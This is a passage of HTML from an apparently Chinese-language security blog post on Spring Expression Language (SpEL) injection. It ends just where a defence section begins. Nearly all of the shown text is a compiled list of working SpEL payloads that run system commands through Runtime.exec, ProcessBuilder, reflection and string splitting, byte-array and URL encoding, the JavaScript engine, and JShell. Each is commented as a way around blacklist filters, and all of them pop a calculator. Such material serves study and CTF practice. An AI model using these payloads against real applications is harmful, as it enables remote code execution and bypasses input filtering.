number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//request.getMethod()为GET</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//Cookie</span>#request<span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反射-字符串拼贴"><a href="#反射-字符串拼贴" class="headerlink" title="反射+字符串拼贴"></a>反射+字符串拼贴</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>newString<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ban了getSuperClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="部分poc整理"><a href="#部分poc整理" class="headerlink" title="部分poc整理"></a>部分poc整理</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// PoC原型</span><span class="token comment">// Runtime</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// ProcessBuilder</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token comment">// Bypass技巧</span><span class="token comment">// 反射调用</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// 同上，需要有上下文环境</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// 同上，需要有上下文环境</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><span class="token comment">// byte数组内容的生成后面有脚本</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><span class="token comment">// byte数组内容的生成后面有脚本</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎通用PoC</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"</span><span class="token operator">+</span><span class="token string">"ng.Run"</span><span class="token operator">+</span><span class="token string">"time.getRu"</span><span class="token operator">+</span><span class="token string">"ntime().ex"</span><span class="token operator">+</span><span class="token string">"ec(s);"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎+反射调用</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎+URL编码</span><span class="token comment">// 其中URL编码内容为：</span><span class="token comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLDecoder</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span class="token comment">// JDK9新增的shell，还未测试</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">SomeWhitelistedClassNotPartOfJDK</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"jdk.jshell.JShell"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Methods<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'whatever java code in one statement'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><pre class="line-numbers 